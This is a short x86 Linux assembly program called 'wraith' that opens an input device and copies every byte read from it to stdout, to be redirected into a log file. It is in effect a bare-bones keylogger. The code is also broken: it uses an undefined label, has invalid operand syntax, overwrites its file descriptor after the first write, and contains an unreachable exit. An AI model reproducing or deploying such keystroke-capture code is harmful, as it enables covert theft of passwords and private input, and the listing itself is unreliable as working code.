section .data
Usage	db	'Usage: wraith input_device > file.log'

section .bss
ReadBuffer:	resb	64
InputDevice:	resb	64

section .text
	global _start

_start:
	pop	ebx
	pop	ebx
	pop	ebx
	mov	InputDevice, ebx
	call	_open
	mov	ebx, eax
_loop:
	call	_read
	call	_write
	jmp	_loop
	call	_exit

_open:
	mov	ecx, 7
	mov	ebx, KeyboardPath
	mov	eax, 5
	int	0x80
	ret

_exit:
	mov	ebx, 1
	mov	eax, 1
	int	0x80

_read:
	mov	edx, 1
	mov	ecx, ReadBuffer
	mov	eax, 3
	int	0x80
	ret

_write:
	mov	edx, 1
	mov	ecx, ReadBuffer
	mov	ebx, 1
	mov	eax, 4
	int	0x80
	ret
